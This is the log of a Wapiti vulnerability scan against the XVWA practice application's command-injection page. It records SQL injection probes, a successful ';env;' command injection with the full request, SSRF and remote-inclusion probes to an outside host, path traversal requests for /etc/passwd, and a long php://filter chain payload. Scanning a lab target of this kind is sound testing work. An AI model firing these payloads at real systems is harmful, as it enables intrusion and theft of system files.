2024-03-20 15:25:12.595 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:12.713 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:12.714 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:12.844 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 15:25:12.845 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_9af6d109.db
2024-03-20 15:25:12.848 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
2024-03-20 15:25:12.881 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 15:25:12.881 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 15:25:13.006 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 15:25:13.007 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 15:25:13.007 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 15:25:13.017 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.044 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:13.051 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:13.075 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 15:25:13.115 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 15:25:13.131 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.131 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 15:25:13.132 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 15:25:13.176 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 15:25:13.248 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 15:25:13.261 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.261 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/cmdi/?target=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 15:25:13.289 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/cmdi/?target=%2F%2Fopenbugbounty.org%2F
2024-03-20 15:25:13.326 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:13.334 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:13.347 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-20 15:25:13.356 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.356 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%C2%BF%27%22%28 (0)
2024-03-20 15:25:13.395 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%20AND%2046%3D62%20AND%2074%3D74 (0)
2024-03-20 15:25:13.422 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%27%20AND%2016%3D54%20AND%20%2739%27%3D%2739 (0)
2024-03-20 15:25:13.448 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%22%20AND%2059%3D139%20AND%20%2248%22%3D%2248 (0)
2024-03-20 15:25:13.469 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%29%20AND%2012%3D83%20AND%20%2867%3D67 (0)
2024-03-20 15:25:13.497 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%27%29%20AND%2082%3D162%20AND%20%28%2799%27%3D%2799 (0)
2024-03-20 15:25:13.521 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%22%29%20AND%2056%3D72%20AND%20%28%2261%22%3D%2261 (0)
2024-03-20 15:25:13.561 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:13.595 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%20AND%2052%3D124%20AND%2057%3D57 (1)
2024-03-20 15:25:13.625 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%27%20AND%2021%3D43%20AND%20%2726%27%3D%2726 (1)
2024-03-20 15:25:13.653 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%22%20AND%2026%3D124%20AND%20%2210%22%3D%2210 (1)
2024-03-20 15:25:13.677 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%29%20AND%2090%3D116%20AND%20%2874%3D74 (1)
2024-03-20 15:25:13.701 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%27%29%20AND%2083%3D177%20AND%20%28%2758%27%3D%2758 (1)
2024-03-20 15:25:13.726 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=default%22%29%20AND%2073%3D138%20AND%20%28%2265%22%3D%2265 (1)
2024-03-20 15:25:13.758 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:13.798 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 15:25:13.810 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.813 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=%3Benv%3B (0)
2024-03-20 15:25:13.891 | RED      | wapitiCore.attack.mod_exec:attack:202 - ---
2024-03-20 15:25:13.891 | RED      | wapitiCore.attack.mod_exec:attack:203 - Command execution in http://web/xvwa/vulnerabilities/cmdi/ via injection in the parameter target
2024-03-20 15:25:13.891 | RED      | wapitiCore.attack.mod_exec:attack:209 - Evil request:
2024-03-20 15:25:13.891 | RED      | wapitiCore.attack.mod_exec:attack:210 -     GET /xvwa/vulnerabilities/cmdi/?target=%3Benv%3B HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: PHPSESSID=jj48ri6diecbrddhqk5npo5vlm
2024-03-20 15:25:13.892 | RED      | wapitiCore.attack.mod_exec:attack:211 - ---
2024-03-20 15:25:13.902 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:13.908 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:13.926 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 15:25:13.940 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:13.940 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F2jgfjj%2F1%2F746172676574%2F (0)
2024-03-20 15:25:13.962 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:13.973 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:13.989 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=2jgfjj for results, please wait...
2024-03-20 15:25:16.074 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 15:25:16.085 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:16.108 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 15:25:16.194 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 15:25:16.206 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:16.228 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 15:25:16.229 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 15:25:16.293 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 15:25:16.294 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 15:25:16.396 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 15:25:16.414 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:16.419 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-20 15:25:16.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-20 15:25:16.452 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=%2Fetc%2Fpasswd (0)
2024-03-20 15:25:16.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:16.483 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=%2Fetc%2Fservices (0)
2024-03-20 15:25:16.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.511 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 15:25:16.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-20 15:25:16.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-20 15:25:16.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:16.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.603 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-20 15:25:16.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-20 15:25:16.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-20 15:25:16.660 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:16.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:16.698 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:16.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:16.743 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:16.762 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:16.784 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.804 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.822 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:16.838 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:16.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.878 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:16.894 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-20 15:25:16.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:16.954 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:16.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:16.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:17.003 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:17.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:17.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.067 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:17.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:17.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.119 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:17.151 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 15:25:17.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
